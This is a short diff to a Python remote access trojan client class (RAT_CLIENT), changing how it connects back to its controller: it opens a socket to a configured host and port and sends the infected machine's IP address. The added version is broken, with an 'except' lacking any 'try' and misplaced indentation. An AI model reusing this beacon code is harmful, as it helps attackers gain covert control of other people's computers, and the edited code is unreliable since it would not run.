@@ -44,21 +44,18 @@ class RAT_CLIENT:
     def build_connection(self):
         connected = False
         global s
-        while not connected:  
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((self.host, self.port))
-                sending = socket.gethostbyname(socket.gethostname())
-                s.send(sending.encode())
-                command = s.recv(1024).decode()
-                if command == 'recibido':
-                    connected = True
-                    print("Connect Establish")
-            except socket.error as e:
-                print("Attempting to connect...")
-                time.sleep(10)
-            
-    
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.host, self.port))
+        sending = socket.gethostbyname(socket.gethostname())
+        s.send(sending.encode())
+        command = s.recv(1024).decode()
+            if command == 'recibido':
+                connected = True
+                print("Connect Establish")
+        except socket.error as e:
+            print("Attempting to connect...")
+            time.sleep(10)
+        
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
         for i in range(len(output)):
